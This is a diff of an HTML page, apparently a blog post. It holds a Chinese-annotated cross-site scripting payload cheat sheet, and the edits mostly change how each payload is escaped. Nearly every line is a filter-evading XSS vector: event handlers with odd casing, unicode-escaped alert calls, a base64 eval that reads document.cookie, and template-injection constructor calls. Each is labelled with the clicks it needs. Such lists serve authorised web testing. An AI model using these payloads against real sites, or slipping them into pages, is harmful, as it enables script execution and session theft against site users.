@@ -358,7 +358,7 @@
 </li>
 <li><p>#上面那么多是一整个xss大混杂</p>
 </li>
-<li><p>“&quot;&gt;&lt; s&gt;<a href="mailto:&#x31;&#50;&#x33;&#53;&#x36;&#x37;&#56;&#57;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#x31;&#50;&#x33;&#53;&#x36;&#x37;&#56;&#57;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;</a>    邮箱xss(验证)</p>
+<li><p>“&quot;&gt;&lt; s&gt;<a href="mailto:&#49;&#50;&#51;&#53;&#54;&#x37;&#x38;&#x39;&#64;&#x71;&#113;&#46;&#99;&#111;&#109;">&#49;&#50;&#51;&#53;&#54;&#x37;&#x38;&#x39;&#64;&#x71;&#113;&#46;&#99;&#111;&#109;</a>    邮箱xss(验证)</p>
 </li>
 <li><p><code>&lt;sTylE OnLoAd=alert(1)&gt;</code></p>
 </li>
@@ -401,19 +401,19 @@
 </li>
 <li><p><code>&lt;script&gt;eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuY29va2llKTs=&#39;));&lt;/script&gt;</code></p>
 </li>
-<li><p><code><d3"<"/onclick="1>[confirm``]"<">dianwo </code>    需要点击</p>
+<li><p><code>`&lt;d3"&lt;"/onclick="1"&gt;[confirm``]"&lt;"&gt;dianwo `</code>    需要点击</p>
 </li>
-<li><p><code><w="/x="y>"/oNCliCk=`<`[confir\u006d``]>dianwo</code>   需要点击</p>
+<li><p><code>&lt;w="/x="y&gt;"/oNCliCk=`&lt;`[confir\u006d``]&gt;dianwo   需要点击</code></p>
 </li>
-<li><p><code><w="/x="y>"/ondblclick=`<`[confir\u006d``]>dianwo2 </code>    需要双击</p>
+<li><p><code>&lt;w="/x="y&gt;"/ondblclick=`&lt;`[confir\u006d``]&gt;dianwo2</code>     需要双击</p>
 </li>
-<li><p><code><w="/x="y>"/oNDblCliCk=`<`[confir\u006d``]>dianwo2 </code>    需要双击</p>
+<li><p><code>&lt;w="/x="y&gt;"/oNDblCliCk=`&lt;`[confir\u006d``]&gt;dianwo2</code>     需要双击</p>
 </li>
-<li><p><code><!'/*"/*/'/*/"/*-->< /Script><Image SrcSet=K */; OnError=confirm`1` //></code></p>
+<li><p><code>&lt;!'/<em>"/</em>/'/<em>/"/</em>--&gt;&lt; /Script&gt;&lt;Image SrcSet=K */; OnError=confirm`1` //&gt;</code></p>
 </li>
 <li><p><code>&lt;img/src/onerror=\u0061\u006c\u0065\u0072\u0074(1)&gt;</code></p>
 </li>
-<li><p><code><svg onload=setInterval`alert\x28document.domain\x29`>    </code></p>
+<li><p><code>&lt;svg onload=setInterval`alert\x28document.domain\x29`&gt;</code></p>
 </li>
 </ul>
 - `<img src=1 onerror=javascript:{{constructor.constructor('alert(1)')()}}>`    点击一次
@@ -425,9 +425,9 @@
 - `<a href=javascript:{{constructor.constructor('alert(1)')()}}>dianwo</a>`   点击一次
 
 <ul>
-<li><p><code><d3"<"/onclick="1>[confirm``]"<">dianwo</code>    点击一次</p>
+<li><p><code>&lt;d3"&lt;"/onclick="1&gt;[confirm``]"&lt;"&gt;dianwo</code>    点击一次</p>
 </li>
-<li><p><code><d3"<"/oNDblCliCk="1>[confirm``]"<">dianwo</code>   需要双击</p>
+<li><p><code>&lt;d3"&lt;"/oNDblCliCk="1&gt;[confirm``]"&lt;"&gt;dianwo   需要双击</code></p>
 </li>
 <li><p><code>&lt;%00EEEE&lt;svg /\/\//ONLoad=&#39;a\u006c\u0065\u0072\u0074(1)&#39;/\/\/\&gt;svg&gt;</code></p>
 </li>
